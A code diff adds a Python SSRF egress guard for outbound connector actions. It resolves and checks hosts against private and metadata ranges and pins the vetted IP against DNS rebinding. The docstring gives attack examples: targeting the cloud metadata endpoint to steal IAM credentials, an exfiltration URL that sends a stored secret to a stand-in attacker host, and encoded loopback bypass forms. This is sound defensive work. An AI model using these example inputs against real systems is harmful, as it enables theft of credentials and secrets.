@@ -1,0 +1,146 @@
+"""SSRF egress guard for outbound connector actions.
+
+The action path (executor._fire_action_request) resolves {{secrets.*}} into the URL, headers and
+body and then makes the request with NO host check at all. That is a double-barrelled SSRF: an
+untrusted author can point an action at the cloud metadata endpoint (169.254.169.254) to steal
+the instance's IAM role, or at http://attacker/?k={{secrets.stripe_key}} to exfiltrate a stored
+secret. The only guard that existed lived on /actions/test -- which deliberately does NOT inject
+stored secrets -- so it protected the harmless path and left the dangerous one open.
+
+This is a denylist done right, plus optional allowlisting:
+
+  * scheme must be http/https (no file://, gopher://, etc.);
+  * the host is RESOLVED and every resulting IP is checked against private/loopback/link-local/
+    reserved/multicast/unspecified ranges. Resolving is what a string blocklist cannot do -- it
+    catches 127.1, the integer form 2130706433, 0x7f.1, IPv6-mapped ::ffff:169.254.169.254, and
+    a public name that resolves to a private A record;
+  * the vetted IP is PINNED for the actual connection (see build_pinned_request), so a DNS
+    rebind between the check and the connect cannot swing the target to a private address;
+  * an optional allowlist (RULEMIND_ACTION_ALLOWED_HOSTS) turns this into deny-by-default.
+
+Redirects are handled by the caller disabling redirect-following, so a 302 to metadata is never
+chased.
+"""
+from __future__ import annotations
+
+import ipaddress
+import os
+import socket
+from dataclasses import dataclass
+from typing import List, Optional
+from urllib.parse import urlparse, urlunparse
+
+__all__ = ["EgressBlocked", "PinnedRequest", "build_pinned_request", "vet_url"]
+
+
+class EgressBlocked(Exception):
+    """The target URL failed the SSRF guard. Carries a caller-safe reason."""
+
+
+@dataclass
+class PinnedRequest:
+    url: str          # the URL to actually connect to, host replaced by the vetted IP
+    host_header: str  # the Host header value (original host[:port])
+    sni_hostname: str # SNI + cert-verification name for TLS (the original host)
+    original_url: str
+
+
+def _allowlist() -> Optional[set]:
+    raw = os.getenv("RULEMIND_ACTION_ALLOWED_HOSTS", "").strip()
+    if not raw:
+        return None  # no allowlist configured -> fall back to the range denylist below
+    return {h.strip().lower() for h in raw.split(",") if h.strip()}
+
+
+def _is_public(ip_text: str) -> bool:
+    ip = ipaddress.ip_address(ip_text)
+    # An IPv4-mapped IPv6 address (::ffff:127.0.0.1) is classified on its embedded v4 address --
+    # ipaddress does not treat the mapped form as loopback/private on its own.
+    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
+        ip = ip.ipv4_mapped
+    return not (
+        ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
+        or ip.is_multicast or ip.is_unspecified
+    )
+
+
+def _resolve(host: str, port: int) -> List[str]:
+    try:
+        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+    except socket.gaierror as exc:
+        raise EgressBlocked("DNS resolution failed for {0}".format(host)) from exc
+    ips: List[str] = []
+    for info in infos:
+        addr = str(info[4][0])
+        if addr not in ips:
+            ips.append(addr)
+    if not ips:
+        raise EgressBlocked("host {0} did not resolve".format(host))
+    return ips
+
+
+def vet_url(url: str) -> str:
+    """Validate a URL against the SSRF policy and return the single vetted IP to connect to.
+
+    Raises EgressBlocked with a caller-safe reason on any failure.
+    """
+    parsed = urlparse(url)
+    if parsed.scheme not in ("http", "https"):
+        raise EgressBlocked("only http/https action URLs are allowed")
+    host = parsed.hostname
+    if not host:
+        raise EgressBlocked("action URL has no host")
+
+    allow = _allowlist()
+    if allow is not None and host.lower() not in allow:
+        raise EgressBlocked("host {0} is not in the action allowlist".format(host))
+
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    ips = _resolve(host, port)
+    for ip in ips:
+        if not _is_public(ip):
+            # Every resolved address must be public: a host resolving to even one internal IP is
+            # refused, so a name with mixed records can't be used to sneak in.
+            raise EgressBlocked("{0} resolves to non-public address {1}".format(host, ip))
+    return ips[0]
+
+
+def build_pinned_request(url: str) -> PinnedRequest:
+    """Vet `url` and return a PinnedRequest that connects to the vetted IP.
+
+    Connecting to the IP (not the name) closes the DNS-rebinding window: the address is resolved
+    and checked ONCE, and that same address is what the socket connects to. The Host header and
+    TLS SNI keep the original hostname so virtual hosting and certificate verification still work.
+    """
+    vetted_ip = vet_url(url)
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+    # Bracket IPv6 literals in the netloc.
+    ip_netloc = "[{0}]".format(vetted_ip) if ":" in vetted_ip else vetted_ip
+    if parsed.port:
+        ip_netloc = "{0}:{1}".format(ip_netloc, parsed.port)
+    pinned_url = urlunparse(parsed._replace(netloc=ip_netloc))
+    host_header = host if not parsed.port else "{0}:{1}".format(host, parsed.port)
+    return PinnedRequest(url=pinned_url, host_header=host_header, sni_hostname=host, original_url=url)
+
+
+# Clamps for author-supplied action tunables. Unclamped, one action could be
+# timeoutMs=600000 x retries=10 -- a 100-minute request holding a worker.
+MAX_TIMEOUT_MS = int(os.getenv("RULEMIND_ACTION_MAX_TIMEOUT_MS", "30000"))
+MAX_RETRIES = int(os.getenv("RULEMIND_ACTION_MAX_RETRIES", "5"))
+
+
+def clamp_timeout_ms(value: object) -> int:
+    try:
+        ms = int(value)  # type: ignore[call-overload]
+    except (TypeError, ValueError):
+        return 5000
+    return max(1, min(ms, MAX_TIMEOUT_MS))
+
+
+def clamp_retries(value: object) -> int:
+    try:
+        n = int(value)  # type: ignore[call-overload]
+    except (TypeError, ValueError):
+        return 0
+    return max(0, min(n, MAX_RETRIES))
